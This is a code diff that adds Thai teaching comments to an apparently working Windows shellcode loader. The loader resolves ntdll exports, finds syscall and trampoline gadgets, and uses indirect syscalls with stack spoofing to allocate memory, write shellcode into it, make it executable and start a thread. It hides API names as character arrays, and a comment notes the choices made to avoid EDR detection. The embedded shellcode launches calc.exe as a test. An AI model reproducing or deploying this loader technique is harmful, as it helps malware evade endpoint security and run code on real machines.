@@ -5,6 +5,7 @@
 
 int main() {
 
+	// หา Base Address Native Dll
 	ULONG_PTR NtDllAddr = getNtdllBase();
 	if (NtDllAddr == 0) {
 		cout << "Error! NtDllBase is not found! \nError code is: " << GetLastError() << endl;
@@ -14,6 +15,7 @@ int main() {
 		cout << "NtDllBase is at: 0x" << hex << uppercase << NtDllAddr << endl;
 	}
 
+	// หา Native Dll Header
 	PIMAGE_NT_HEADERS64 pNtHeader = getNtHeader(NtDllAddr);
 	if (pNtHeader == NULL) {
 		cout << "Native Header is not found! \n Error code is: " << GetLastError() << endl;
@@ -25,6 +27,9 @@ int main() {
 
 	GadgetDetail findGadgetBox = { 0 };
 
+	// ทำการโยน Dll Header ที่หามาได้เข้าไปเปรียบเทียบแบบ String
+	// สังเกตว่าเราจะโยนเข้าไปด้วย Pointer ชี้ตำแหน่งของตัวแปรที่เก็บ Native Header แทนโยนตัวจริงเข้าไป
+	// และส่ง findGadgetBox เข้าไปเพื่อรับเอาค่า Virtual Address และ ขนาดของ VA หลังหาเจอออกมาเก็บไว้
 	if (findTextSection(pNtHeader, NtDllAddr, findGadgetBox)) {
 		cout << "\n[+] Found .text at: 0x" << (void*)findGadgetBox.VA << endl;
 	}
@@ -33,6 +38,9 @@ int main() {
 		return -1;
 	}
 
+	// หา Export Table เพื่อนำมาใช้งานในการทำ Indirect Syscalls 
+	// เราจะหาทั้ง ตำแหน่งของ Export Directory, name ของ SSN, 
+	// ordinal ของ SSN นั้น, ตำแหน่งของฟังชันต์ และ จำนวนของชื่อ SSN
 	EXPORT_TABLES ntdllExports = { 0 };
 	if (getExportTables(NtDllAddr, pNtHeader, &ntdllExports)) {
 		cout << "\n  Successfully resolved ntdll export tables!" << endl;
@@ -43,6 +51,9 @@ int main() {
 		cout << "[+] Number Of Names is: " << hex << ntdllExports.pExportDir->NumberOfNames << endl;
 	}
 
+	// หา Trampoline Gadget สำหรับเอาไปกลับบ้าน
+	// ไม่เข้าใจให้กลับไปอ่านในเอกสาร Stack Spoofing หมวด Trampoline
+	// รายละเอียดเต็ม ให้เข้าไปดูใน ModularStack ฟังชันต์ชื่อ findGadget
 	PBYTE TrampolineGadget = findGadget(findGadgetBox);
 	if (TrampolineGadget == nullptr) {
 		cout << "\nTrampoline Gadget is null pointer! \nError Code is: " << GetLastError() << endl;
@@ -52,6 +63,8 @@ int main() {
 		cout << "\n[+] 1.Trampoline Gadget  is found at: 0x" << hex << (void*)TrampolineGadget << endl;
 	}
 
+	// ตรงนี้คือการหา Gadget สำหรับการทำ Indirect Syscalls
+	// เราจะใช้ findGadgetBox เพิ้อดึงเอาตำแหน่งของเลข SSN มาหา Gadget สำหรับการทำงานขาไป
 	PBYTE SyscallGadget = findSyscallGadget(findGadgetBox);
 	if (SyscallGadget == nullptr) {
 		cout << "Syscall Gadget is null pointer! \nError Code is: " << GetLastError() << endl;
@@ -61,6 +74,9 @@ int main() {
 		cout << "[+] 2.Syscall Gadget is found at: 0x" << hex << (void*)SyscallGadget << endl;
 	}
 
+	// เริ่มการหาฟังชันต์ เราจะใช้ String ในการเปรียบเทียบกับที่อยู่ของ SSN ใน ntdllExports
+	// แน่นอนว่า เราจะใช้ Algorithm แบบ Freshycall ในการหา
+	// หากไม่เข้าใจ โปรดอ่านที่เอกสารวิจัย Indirect Syscalls 
 	const char targetFuncAlloc[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e',
 									 'V', 'i', 'r', 't', 'u', 'a', 'l',
 									 'M', 'e', 'm', 'o','r', 'y', 0 };
@@ -73,6 +89,7 @@ int main() {
 		cout << "\n[+] SSN Gadget is: 0x" << hex << SSNAlloc << endl;
 	}
 
+	// เริ่มส่งข้อมูลที่หามาได้เข้า ASM stub เพื่อทำงานร่วมกับเทคนิค Stack Spoofing
 	HANDLE hProcess = (HANDLE)-1;
 	PVOID baseAddr = nullptr;
 	SIZE_T regionSize = 0x1000;
@@ -83,7 +100,7 @@ int main() {
 		0,                              // 3. ZeroBits
 		&regionSize,                    // 4. Region Size Pointer
 		MEM_COMMIT | MEM_RESERVE,       // 5. Allocation Type (0x3000)
-		PAGE_READWRITE,					// 6. Protection (0x40 - ระวังตอนใช้จริง EDR ไม่ชอบ RWX นะ)
+		PAGE_READWRITE,					// 6. Protection (ปรับเป็น Read Write ก่อน)
 		SSNAlloc,                       // 7. [KEY 1] SSN 
 		SyscallGadget,                  // 8. [KEY 2] Syscall Address
 		TrampolineGadget                // 9. [KEY 3] JMP RBX Address
@@ -96,6 +113,7 @@ int main() {
 		cout << "[-] Failed to allocate memory. NTSTATUS: 0x" << hex << status << endl;
 	}
 
+	// Shellcode เด้งเครื่องเลขสำหรับทดสอบว่า Loader ทำงานสำเร็จ
 	const uint8_t shellcode[] =
 		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
 		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
@@ -117,6 +135,7 @@ int main() {
 		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
 		"\x63\x2e\x65\x78\x65\x00";
 
+	// หาฟังชันก์เขียน Shellcode ลง RAM
 	char targetFuncWrite[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 
 							   'V', 'i', 'r', 't', 'u', 'a', 'l', 
 							   'M', 'e', 'm', 'o', 'r', 'y', 0 };
@@ -131,15 +150,16 @@ int main() {
 		cout << "Function name of SSN number is: " << targetFuncWrite << endl;
 	}
 
+	// ส่งเข้า Parameter ให้ ASM Stub ทำงาน
 	NTSTATUS statusWrite = NtWrite(
-		hProcess,
-		baseAddr,
-		(PVOID)shellcode,
-		sizeof(shellcode),
-		NULL,
-		NtWriteSSN,
-		SyscallGadget,                  
-		TrampolineGadget
+		hProcess,						// 1. Process Handle
+		baseAddr,						// 2. Base Address Pointer
+		(PVOID)shellcode,				// 3. Buffer ของ Shellcode
+		sizeof(shellcode),				// 4. Size of Shellcode
+		NULL,							// 5. NumberOfBytesWritten เราไม่อยากรู้ว่าเท่าไหร่ ปล่อย
+		NtWriteSSN,						// 6. [KEY 1] SSN 
+		SyscallGadget,					// 7. [KEY 2] Syscall Address
+		TrampolineGadget				// 8. [KEY 3] JMP RBX Address
 	);
 	if (statusWrite == 0) {
 		cout << "[+] SUCCESS! Memory written via Spoofed Syscall!" << endl;
@@ -166,18 +186,20 @@ int main() {
 		cout << "Function name of SSN number is: " << targetFuncProtect << endl;
 	}
 
-	ULONG oldProtect = { 0 };
-	SIZE_T sSize = sizeof(shellcode);
-
+	// สร้าง Variable สำหรับรับค่า out ออกมา
+	ULONG oldProtect = { 0 };				// Protection เก่า RW ที่เรา set ไว้ตอนแรก
+	SIZE_T sSize = sizeof(shellcode);		// ขนาดของ shellcode
+	
+	// ส่งเข้า Parameter ให้ ASM Stub ทำงาน
 	NTSTATUS statusProtect = NtProtect(
-		hProcess,
-		&baseAddr,
-		&sSize,
-		PAGE_EXECUTE_READ,
-		&oldProtect,
-		NtProtectSSN,
-		SyscallGadget,
-		TrampolineGadget
+		hProcess,						// 1. Process Handle
+		&baseAddr,						// 2. Base Address Pointer
+		&sSize,							// 3. Size of Shellcode
+		PAGE_EXECUTE_READ,				// 4. Protection (ปรับเป็น Execute Read)
+		&oldProtect,					// 5. รับ Protection เก่ามาเก็บไว้
+		NtProtectSSN,					// 6. [KEY 1] SSN 
+		SyscallGadget,					// 7. [KEY 2] Syscall Address
+		TrampolineGadget				// 8. [KEY 3] JMP RBX Address
 	);
 	if (statusProtect == 0) {
 		cout << "[+] SUCCESS! Memory Protection via Spoofed Syscall!" << endl;
@@ -202,19 +224,21 @@ int main() {
 		cout << "Function name of SSN number is: " << targetFuncCreate << endl;
 	}
 
+	// สร้าง variable สำหรับเปิด Thread เพื่อการทำงาน
 	HANDLE hThread = NULL;
 
+	// ส่งเข้า Parameter ให้ ASM Stub ทำงาน
 	NTSTATUS statusCreate = NtCreate(
-		&hThread,
-		THREAD_ALL_ACCESS,
-		NULL, 
-		hProcess,
-		baseAddr,
-		NULL, 0, 0, 0, 0,
-		NULL,
-		NtCreateSSN,
-		SyscallGadget,
-		TrampolineGadget
+		&hThread,						// 1. Thread Handle
+		THREAD_ALL_ACCESS,				// 2. Thread permission
+		NULL,							// 3. กำหนดคุณสมบัติ Attribute เราข้าม
+		hProcess,						// 4. Process Handle
+		baseAddr,						// 5. Base Address Pointer
+		NULL, 0, 0, 0, 0,				// parameter 6-10 เราไม่ปรับหรือใช้อะไร ข้าม
+		NULL,							// parameter 11 ข้ามเช่นกัน
+		NtCreateSSN,					// 12. [KEY 1] SSN
+		SyscallGadget,					// 13. [KEY 2] Syscall Address
+		TrampolineGadget				// 14. [KEY 3] JMP RBX Address
 	);
 	if (statusCreate == 0) {
 		cout << "[+] SUCCESS! Memory Created via Spoofed Syscall!" << endl;
@@ -226,8 +250,10 @@ int main() {
 
 	cout << "\nMISSION ACCOMPLISHED!" << endl;
 
+	// รอ Thread ทำงานจบ
 	WaitForSingleObject(hThread, 10);
 
+	// ปิด handle ของ Thread และ Process ตามลำดับ
 	CloseHandle(hThread);
 	CloseHandle(hProcess);
 
